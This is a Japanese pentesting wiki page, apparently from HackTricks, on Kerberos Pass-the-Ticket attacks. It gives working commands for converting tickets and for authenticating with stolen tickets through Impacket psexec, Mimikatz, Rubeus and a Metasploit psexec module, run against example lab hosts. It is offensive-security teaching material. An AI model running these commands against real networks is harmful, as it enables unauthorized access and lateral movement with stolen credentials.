# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## 概要

Pass-the-Ticket（PtT）攻撃では、攻撃者は盗んだKerberosチケットを使い、そのアカウントのパスワードを持たずにチケットのプリンシパルとして認証します。チケット付与チケット（TGT）はサービスチケットの要求に使用できます。一方、盗んだサービスチケットは、その対象サービスと有効期間に限定されます。<sup>[[1]](#references)</sup>

チケットの取得手法については、以下を参照してください。

- [Windowsからのチケットの取得](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linuxからのチケットの取得](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## LinuxとWindowsのチケット形式の変換

Kerberosキャッシュは、LinuxではMIT `ccache`ファイル、Windowsでは`.kirbi`ファイルとして扱われることが一般的です。`ticket_converter`は、入力チケットと出力先のパスを指定して、これらの形式を相互に変換します。<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo は Windows 上で Kerberos ticket を扱うツールも提供します。<sup>[[3]](#references)</sup>

## Using a Ticket

Linux では、`KRB5CCNAME` をキャッシュに設定し、Impacket クライアントにパスワードを求めずに Kerberos を使用するよう指示します。<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Windowsでは、MimikatzまたはRubeusを使って`.kirbi`チケットを現在のログオンセッションにインポートできます。`klist`で、作成されたキャッシュを確認します。<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

チケットのインポートによって付与される権限は、チケットに含まれる権限と、対象サービスの認可ポリシーで許可されている範囲を超えません。期限切れ、失効、形式不正、またはスコープが正しく設定されていないチケットは使用できない場合があります。<sup>[[1]](#references)</sup>

Kerberos攻撃の全体像と、関連するチケット取得手法については、TarlogicのKerberos攻撃ガイドを参照してください。<sup>[[7]](#references)</sup>

### Metasploitで外部チケットを再利用する

Metasploitは、Impacketの`KRB5CCNAME`をKerberosモジュールで自動的に読み込みません。プロトコル固有の`::Krb5Ccname`オプションを使って、**ccache file**をモジュールに指定してください。`::Rhostname`には対象のSPNホスト名を、ドメインには対象のドメインを設定します。`RHOST`には引き続き対象のIPを指定できます。これにより、アカウントのパスワードを入力せずに、取得済みのチケットを使用できます。<sup>[[8]](#references)</sup>

必要であれば、まず`.kirbi`をccacheに変換してください。<sup>[[9]](#references)</sup>

たとえば、対象でサービスを作成する権限を持つアカウントのチケットがある場合、そのキャッシュを使って[SMB PsExec module](../lateral-movement/psexec-and-winexec.md)を実行します。<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploitは、まず提供されたキャッシュから一致するサービスチケットを選択します。TGTしか見つからない場合はKDCにサービスチケットを要求するため、その場合もDCへの接続が必要です。サービスチケットのみのキャッシュでは、関係のないホストにはアクセスできません。ほかの対応モジュールでは、オプションのプレフィックスを変更してください（例：[WinRM](../lateral-movement/winrm.md)の場合は`Winrm::Krb5Ccname`）。<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacketの使用例](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos攻撃手法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - サービス認証](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - kirbiファイルとccacheファイルの変換](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit SMBクライアントのKerberos実装](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
